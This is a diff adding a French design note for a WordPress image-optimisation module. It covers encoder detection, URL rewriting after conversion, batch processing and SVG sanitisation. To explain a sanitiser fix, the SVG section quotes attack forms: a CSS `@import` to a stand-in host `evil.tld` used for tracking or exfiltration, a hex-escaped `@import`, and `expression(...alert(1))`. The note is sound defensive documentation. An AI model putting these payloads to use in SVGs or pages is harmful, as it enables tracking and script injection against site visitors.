@@ -1,0 +1,27 @@
+# Module ImageOptimizer
+
+`includes/Modules/ImageOptimizer/` — orchestrateur (`Module.php`) au-dessus de `ImageProcessor` (conversion/redimensionnement), `MediaLibrary` (intégration à la liste des médias), `BulkProcessor` (optimisation par lots de toute la bibliothèque via WP-Cron), `UrlRewriter` (réécriture des URL après conversion) et `SvgHandler` (téléversement SVG sécurisé).
+
+## Détection des encodeurs
+
+`ImageProcessor::get_capabilities()` sonde les encodeurs par de **vrais encodages** 1×1 (queryFormats/gd_info mentent sur certains builds) et met le résultat en transient 24 h, clé liée aux versions PHP/GD/Imagick. C'est la seule détection : `templates/admin/settings.php` la réutilise, il n'y a plus de second calcul. `is_animated()` court-circuite par MIME (`ANIMATABLE_MIMES`) : un JPEG n'est jamais chargé dans Imagick pour compter ses frames.
+
+## Réécriture des URLs (`UrlRewriter`)
+
+Convertir renomme le fichier (`photo.jpg` → `photo.webp`) et supprime l'original par défaut : sans réécriture, toute URL déjà insérée (contenus, métas Bricks/ACF, options, `srcset`) pointait vers un fichier disparu, et le bulk cassait chaque image en page. `process_attachment_metadata()` collecte les paires ancien/nouveau chemin **relatif au dossier uploads** (original + chaque taille convertie) et `UrlRewriter::rewrite()` les applique à `posts` (content, excerpt), `postmeta` et `options`. Trois règles : chercher `/{chemin}` avec une frontière après l'extension (indifférent au schéma, au domaine et à un CDN, et `other-photo.jpg` n'est pas touché) ; traiter aussi la forme à barres échappées `\/…` (attributs de blocs Gutenberg, JSON) ; **désérialiser** les valeurs sérialisées avant de remplacer, sinon les longueurs `s:N:` sont fausses et la valeur est corrompue. Une seule requête LIKE par table et par appel, les racines (`/2024/01/photo`) réunies dans un même OR : le bulk **accumule** les paires d'un lot (`begin_deferred_url_rewrites()` avant chaque image, `flush_url_rewrites()` après le lot via `after_batch_fn` de `BulkProcessor`) pour trois requêtes par lot au lieu de trois par image. La réécriture joue aussi sur `wp_generate_attachment_metadata` : un outil de régénération de miniatures le rejoue sur des médias déjà en page, on ne peut pas supposer un téléversement. Désérialisation en liste blanche (`stdClass` seul) : aucun `__wakeup` d'une classe tierce depuis une méta. Le `guid` de l'attachement est réécrit via `$wpdb` (`wp_update_post()` ne le modifie pas sur une mise à jour).
+
+## Traitement par lots (`BulkProcessor`)
+
+`BulkProcessor` persiste son état (dont le `user_id` initiateur) sous `{module_option_key}` + `BULK_STATE_SUFFIX` et prend un callback optionnel `on_complete_fn(int $user_id)` déclenché une fois à la fin du traitement — le module s'en sert pour déposer une notice persistante pour cet utilisateur (fonctionne bien que le tick cron n'ait pas d'utilisateur courant). L'état courant est passé au JS via `get_admin_js_data()` sous `bulkState` pour que l'interface reprenne l'affichage de progression au chargement. Le flux comporte une étape de pré-scan (`ajax_bulk_scan` → `BulkProcessor::ajax_scan()`) avant `ajax_bulk_start`.
+
+## SVG (`SvgHandler`)
+
+`SvgHandler` n'enregistre ses filtres que si le réglage `svg_upload` est actif. Il restreint le téléversement par rôle (`svg_roles`, assaini contre les vrais rôles WP dans `Module::sanitize_roles()`), ajoute `image/svg+xml` à `upload_mimes`, corrige la détection MIME/extension de WordPress (`wp_check_filetype_and_ext`), et assainit chaque SVG au téléversement (`wp_handle_upload_prefilter`) par une passe DOMDocument en liste blanche — retire les balises hors liste, les gestionnaires d'événements, les `href`/`xlink:href` dangereux (seules les ancres internes et `data:image/*` sont autorisées), les attributs/styles porteurs de script, et rejette DOCTYPE+ENTITY (XXE). Ne charge jamais `LIBXML_NOENT`. Un fichier qui échoue l'assainissement est rejeté avec une erreur plutôt que stocké.
+
+`<style>` est sur la liste blanche, et son **contenu textuel** est assaini par `clean_style_element()` → `sanitize_css()`. Seuls les *attributs* l'étaient : un `@import url("//evil.tld/x.css")` traversait l'assainisseur intact et déclenchait une requête sortante à chaque rendu du SVG (traçage, exfiltration de contexte via `url()`, CSS arbitraire si le SVG est intégré en ligne). Deux précautions d'ordre, les mêmes que pour `normalize_sql()` côté Base de données : les **commentaires CSS partent en premier**, et les **échappements hexadécimaux sont décodés avant tout test** — `\40 import` *est* `@import` pour le navigateur, ne pas le décoder ne reconnaît que la forme naïve de l'attaque. Les ressources (`url()`) passent par `is_safe_href()`, la même liste blanche que les attributs `href` : on n'entretient pas deux définitions du « sûr » qui finiraient par diverger. `expression()` et `-moz-binding` font retirer la **déclaration entière**, pas le seul mot-clé — effacer `expression(` laissait `alert(1))` derrière soi, du CSS invalide dans un fichier qu'on vient de déclarer propre.
+
+`SvgHandler::sanitize()` est aussi réutilisé par le picker d'icônes de [MenuCreator](menu-creator.md) (`ajax_sanitize_svg`) : même risque, même liste blanche, pas de second nettoyeur.
+
+## Production
+
+Voir la mémoire de session pour les encodeurs disponibles en production (Dokploy, image php8.5-alpine) : WebP fonctionne, le délégué AVIF manque.
